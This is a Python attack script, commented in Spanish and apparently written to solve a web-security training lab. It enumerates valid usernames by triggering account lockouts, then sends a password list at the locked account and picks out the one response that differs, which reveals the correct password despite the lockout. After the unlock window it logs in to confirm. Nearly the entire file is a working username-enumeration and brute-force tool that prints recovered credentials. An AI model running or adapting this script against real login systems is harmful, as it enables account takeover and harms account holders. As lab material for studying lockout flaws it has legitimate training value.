#!/usr/bin/env python3
"""
Username enumeration via ACCOUNT LOCK como oracle + brute-force "blast through".

El server lockea cuentas existentes tras N fallos; cuentas inexistentes nunca
se lockean. La asimetria revela existencia.

Phase 1: por cada username, N attempts con password basura. Marker de lock =>
        username valido.
Phase 2: NO batchear, NO esperar entre intentos. Blastear los 100 passwords
        contra el username valido. La mayoria de respuestas tienen marker de
        lock; UNA tiene respuesta distinta (302 success o body sin markers de
        error) -> es el password correcto. El check de credenciales sucede
        independiente del lockout: si el pwd es correcto, la respuesta cambia
        aunque la cuenta este lockeada.
Phase 3: esperar unlock window, login real con (user, pwd) y verificar.

Uso:
    python3 bruteforce.py <lab-host> <usernames-file> <passwords-file>
        [--known-user <user>]   # saltar phase 1
        [--threshold 5]          # attempts para disparar lock en phase 1
        [--unlock-wait 65]       # segundos para login final tras phase 2
"""
import argparse
import sys
import time
from urllib.parse import urlencode

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry


LOCK_MARKER = "You have made too many incorrect login attempts"
INVALID_MARKER = "Invalid username or password"


def make_session() -> requests.Session:
    s = requests.Session()
    s.headers.update({
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 lock-as-oracle",
    })
    retry = Retry(total=3, backoff_factor=0.5, status_forcelist=[502, 503])
    s.mount("https://", HTTPAdapter(max_retries=retry, pool_maxsize=64))
    return s


def attempt(session, host, user, pwd):
    body = urlencode({"username": user, "password": pwd})
    r = session.post(f"https://{host}/login", data=body, timeout=30, allow_redirects=False)
    return r.status_code, r.text, r.headers.get("Location", "")


def classify(status, text, location):
    if status == 302 and "/my-account" in location:
        return "success"
    if LOCK_MARKER in text:
        return "locked"
    if INVALID_MARKER in text:
        return "invalid"
    return "neither"


def phase1_enum(session, host, usernames, threshold):
    print(f"\n[*] Phase 1: enum por lock-as-oracle, {len(usernames)} usernames x {threshold} attempts", file=sys.stderr)
    locked = []
    for i, u in enumerate(usernames, start=1):
        last_text = ""
        for _ in range(threshold):
            try:
                _, last_text, _ = attempt(session, host, u, "wrongpassword123")
            except requests.RequestException as e:
                print(f"[!] error en {u}: {e}", file=sys.stderr)
                break
        if LOCK_MARKER in last_text:
            locked.append(u)
            print(f"[+] LOCKED: {u}  (intento {i}/{len(usernames)})", file=sys.stderr)
        if i % 10 == 0:
            print(f"[*] {i}/{len(usernames)} procesados, locked={len(locked)}", file=sys.stderr)
    return locked


def phase2_blast(session, host, user, passwords):
    print(f"\n[*] Phase 2: blast {len(passwords)} passwords contra {user} (sin batching)", file=sys.stderr)
    buckets = {"success": [], "locked": [], "invalid": [], "neither": []}
    for i, pwd in enumerate(passwords, start=1):
        try:
            status, text, location = attempt(session, host, user, pwd)
        except requests.RequestException as e:
            print(f"[!] error en {pwd!r}: {e}", file=sys.stderr)
            continue
        cls = classify(status, text, location)
        buckets[cls].append(pwd)
        if cls in ("success", "neither"):
            print(f"[+] CANDIDATO ({cls}): {user}:{pwd}  status={status} len={len(text)} loc={location!r}", file=sys.stderr)

    print(f"\n[*] distribucion: success={len(buckets['success'])} locked={len(buckets['locked'])} "
          f"invalid={len(buckets['invalid'])} neither={len(buckets['neither'])}", file=sys.stderr)
    return buckets


def phase3_verify(session, host, user, pwd, unlock_wait):
    print(f"\n[*] Phase 3: esperando unlock ({unlock_wait}s) y login real...", file=sys.stderr)
    time.sleep(unlock_wait)
    fresh = make_session()
    status, text, location = attempt(fresh, host, user, pwd)
    cls = classify(status, text, location)
    print(f"[*] login final: status={status} location={location!r} class={cls}", file=sys.stderr)
    return cls == "success", location


def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("host")
    p.add_argument("usernames_file")
    p.add_argument("passwords_file")
    p.add_argument("--known-user", help="saltar phase 1 si el username ya se conoce")
    p.add_argument("--threshold", type=int, default=5)
    p.add_argument("--unlock-wait", type=int, default=65)
    args = p.parse_args()

    with open(args.usernames_file) as f:
        usernames = [line.strip() for line in f if line.strip()]
    with open(args.passwords_file) as f:
        passwords = [line.strip() for line in f if line.strip()]

    session = make_session()

    if args.known_user:
        user = args.known_user
        print(f"[*] phase 1 SKIPPED: usando known-user={user}", file=sys.stderr)
    else:
        locked = phase1_enum(session, args.host, usernames, args.threshold)
        if not locked:
            print("[!] phase 1: no se detecto ningun lock", file=sys.stderr)
            return 1
        if len(locked) > 1:
            print(f"[!] multiples locks detectados: {locked}; usando el primero", file=sys.stderr)
        user = locked[0]

    buckets = phase2_blast(session, args.host, user, passwords)
    candidates = buckets["success"] + buckets["neither"]

    if not candidates:
        print("[!] phase 2: ningun candidato no-locked/no-invalid; revisar respuestas", file=sys.stderr)
        return 1
    if len(candidates) > 1:
        print(f"[!] multiples candidatos: {candidates}; probando el primero", file=sys.stderr)

    pwd = candidates[0]
    ok, location = phase3_verify(session, args.host, user, pwd, args.unlock_wait)
    if ok:
        print(f"\n[+] credenciales: {user}:{pwd}")
        print(f"[+] Location: {location}", file=sys.stderr)
        return 0
    else:
        print(f"\n[!] verificacion fallo; revisar manualmente: {user}:{pwd}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    sys.exit(main())
